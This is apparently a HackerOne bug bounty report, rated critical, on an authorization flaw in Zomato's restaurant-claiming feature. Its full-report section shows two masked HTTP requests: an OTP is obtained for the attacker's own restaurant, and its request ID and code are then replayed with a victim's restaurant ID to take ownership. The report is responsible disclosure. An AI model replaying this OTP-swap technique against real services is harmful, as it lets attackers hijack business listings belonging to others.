# Claiming the listing of a non-delivery restaurant through OTP manipulation

## Metadata
- **Source:** HackerOne
- **Report:** 1330529 | https://hackerone.com/reports/1330529
- **Submitted:** 2021-09-05
- **Reporter:** ashoka_rao
- **Program:** Unknown
- **Bounty:** $3,250
- **Severity:** critical
- **Vuln:** Improper Authorization
- **CVEs:** None
- **Category:** uncategorised

## Summary
**Summary:** Am able to claim any restaurant which is not claimed before.

**Description:** An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2` sends OTP to the restaurant mobile no.

##Request (Request:1) is - 
```
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Sec-Ch-Ua: " Not A;Brand"

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:** Am able to claim any restaurant which is not claimed before.

**Description:** An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2` sends OTP to the restaurant mobile no.

##Request (Request:1) is - 
```
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}
```
which responses -
```
{"status":"success","message":"OTP SENT","requestId":XXXXXXX,"code":2}
```

###Here Attacker gains OTP on his own mobile no by changing the `number` & `resId` to his own restaurant.

By using the following request (Request:2) attacker is able to map his e-mail Id as `Owner / Manager` to Victim restaurant.
##Request:2
```
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXX
Content-Length: 68
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"XXXXXXXXX"}
```

###Here by changing the `verificationCode`  -  (Otp received on Attacker Mobile in response of Request :1 )& `requestId`  (Response of request:1) and `resId` to Victim Restaurant. Request:2 maps e-mail id of Attacker to Victim restaurant.

**Prerequisite - Attacker should have a restaurant page, mapped Mobile No With Email Id.**

**Note : -  If any restaurant is not mapped owner / manager then claimed restaurant can be claimed **

## Impact

Claim a restaurant.

</details>

---
*Analysed by Claude on 2026-05-24*
